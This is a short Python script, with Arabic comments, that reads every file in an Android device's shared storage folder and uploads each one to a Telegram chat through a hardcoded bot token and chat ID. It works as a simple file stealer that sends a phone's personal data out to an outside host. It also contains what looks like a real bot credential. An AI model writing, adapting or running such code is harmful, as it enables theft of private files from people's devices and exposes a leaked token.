import os
import requests

# 🔐 حط بياناتك هون
BOT_TOKEN = "8694159518:AAF4O9s94rmrMcJ2xBbOf4Ov3-QErt64N8c"
CHAT_ID = "7708603881"

folder = "/storage/emulated/0/"



def send_file(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, "rb") as f:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f})

for file in os.listdir(folder):
    path = os.path.join(folder, file)
    if os.path.isfile(path):
        try:
            send_file(path)
        except Exception as e:
            print("خطأ:", e)
